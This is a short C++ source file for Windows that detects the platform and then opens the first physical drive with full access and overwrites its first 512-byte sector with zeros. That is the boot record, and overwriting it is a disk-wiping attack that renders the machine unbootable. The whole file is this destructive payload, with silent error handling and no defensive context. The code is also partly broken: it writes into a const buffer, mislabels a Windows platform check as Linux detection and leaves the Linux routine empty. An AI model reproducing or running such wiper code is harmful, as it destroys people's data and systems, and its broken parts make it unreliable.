#include <Windows.h>
#include <iostream>

#define DBA_SIZE 512

const char delData[DBA_SIZE];

int windowsOverwrite() {

    HANDLE bdaDataOverwrite = CreateFile(
            "\\\\.\\PhysicalDrive0", 
            GENERIC_ALL, 
            FILE_SHARE_READ | FILE_SHARE_WRITE, 
            NULL, 
            OPEN_EXISTING, 
            NULL, 
            NULL
        );
    if ( bdaDataOverwrite == INVALID_HANDLE_VALUE ) {
        printf(" ");
    }
    ZeroMemory(
            delData, 
            DBA_SIZE
        );
    if( 
        WriteFile(
            bdaDataOverwrite, 
            delData, 
            DBA_SIZE, 
            NULL, 
            NULL
        ) == 0 
    ) {
        printf(" ");
    } else {
        printf(" ");
    }
    CloseHandle(bdaDataOverwrite);
    return 0;
}

int linuxOverwrite( ) {
    return 0;
}

int SystemDetection( ) {
    char winDetection[] = "[ DEBUG ] Windows Detected";
    char linDetection2[] = "[ DEBUG ] Linux Detected";
    OSVERSIONINFO osvi;
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&osvi)) {
        if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) {
            printf("%s\n", winDetection);
            windowsOverwrite();
        } else if (osvi.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) {
            printf("%s\n", linDetection2);
            linuxOverwrite();
        }
    }
}

int main() {
    SystemDetection();
}
